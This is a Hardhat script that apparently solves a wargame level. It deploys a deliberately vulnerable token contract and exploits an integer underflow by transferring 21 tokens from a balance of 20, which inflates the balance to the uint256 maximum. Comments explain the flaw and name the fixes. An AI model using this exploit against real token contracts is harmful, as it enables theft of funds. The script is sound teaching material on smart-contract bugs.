import { ethers } from "hardhat";
import { Lvl5 } from "../../typechain";

/**
 * The vulnerability in level 5 resides in an underflow problem.
 * 
 * If we provide a value X that is > 20, the substraction of 20 - X puts it back at the maximum value the uint256 type allows
 * which is 2**256 – 1.
 *
 * This script deploys the faulted contract on Ropsten network and exploits it.
 *
 * To solve it, you can either use:
 * 1. Use solidity version ^0.8.0 which reverts automatically on underflow/overflow arithmetic operations
 * 2. OpenZeppelin's SafeMath library
 */
async function main() {
  const accounts = await ethers.getSigners();
  const ownAddress = accounts[1].address;
  const contractFactory = await ethers.getContractFactory("Lvl5");

  console.log("Deploying contract...");
  const contract = (await contractFactory.connect(accounts[1]).deploy(20)) as Lvl5;
  console.log("Awaiting confirmations...");
  await contract.deployed();
  console.log(`Contract deployed locally at ${contract.address}`);

  const previousSignerBalance = await contract.balanceOf(ownAddress);
  console.log(`Previous wallet balance : ${previousSignerBalance} tokens.`);

  console.log("Exploiting contract with underflow...");
  const exploitTx = await contract.transfer(accounts[0].address, 21);
  await exploitTx.wait();

  const newSignerBalance = await contract.balanceOf(ownAddress);
  console.log("Exploited.");
  console.log(`New wallet balance : ${newSignerBalance} tokens.`);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
